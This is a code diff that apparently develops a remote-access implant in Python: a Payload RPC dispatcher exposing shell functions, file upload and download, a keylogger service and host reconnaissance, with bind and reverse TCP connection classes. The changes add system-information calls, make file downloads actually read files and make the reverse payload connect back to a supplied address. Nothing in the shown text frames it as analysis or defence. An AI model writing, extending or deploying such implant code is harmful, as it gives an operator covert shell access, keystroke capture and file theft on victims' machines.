@@ -102,7 +102,28 @@ class Payload(rpc.RPCDispatcher):
         self._file_service = FileService()
         self._keylogger_service = KeyloggerService()
 
+        self.register_introspection_functions()
+        self.register_system_functions()
         self.register_shell_functions()
+
+    def rpc_echo(self, s):
+        return s
+
+    def rpc_dir(self):
+        return list(self._functions)
+
+    def register_introspection_functions(self):
+        pass
+
+    def register_system_functions(self):
+        funcs = [
+                uname,
+                get_username,
+                get_hostname,
+                get_platform,
+        ]
+        for f in funcs:
+            self.register_function(f)
 
     def register_shell_functions(self):
         funcs = [
@@ -117,10 +138,12 @@ class Payload(rpc.RPCDispatcher):
     def register_file_upload(self):
         self.register_function(self._file_service.file_open)
         self.register_function(self._file_service.file_write)
+        self.register_function(self._file_service.file_close)
 
     def register_file_download(self):
         self.register_function(self._file_service.file_open)
-        self.register_function(self._file_service.file_write)
+        self.register_function(self._file_service.file_read)
+        self.register_function(self._file_service.file_close)
 
     def register_keylogger(self):
         self.register_instance(self._keylogger_service)
@@ -171,6 +194,7 @@ class TCPPayload(Payload):
     RequestHandler = TCPPayloadRequestHandler
 
     def __init__(self, RequestHandler=None):
+        super().__init__()
         if RequestHandler is not None:
             self.RequestHandler = RequestHandler
 
@@ -181,6 +205,9 @@ class TCPPayload(Payload):
             client_address,
             self,
         )
+
+    def handle_connection(self, sock):
+        return self.handle_request(sock)
 
 
 class TCPBindPayload(socketserver.TCPServer, TCPPayload):
@@ -199,5 +226,5 @@ class TCPReversePayload(sock.TCPClient, TCPPayload):
 
     def __init__(self, addr, retry_interval=1):
         TCPPayload.__init__(self)
-        sock.TCPClient.__init__(self)
+        sock.TCPClient.__init__(self, addr)
 
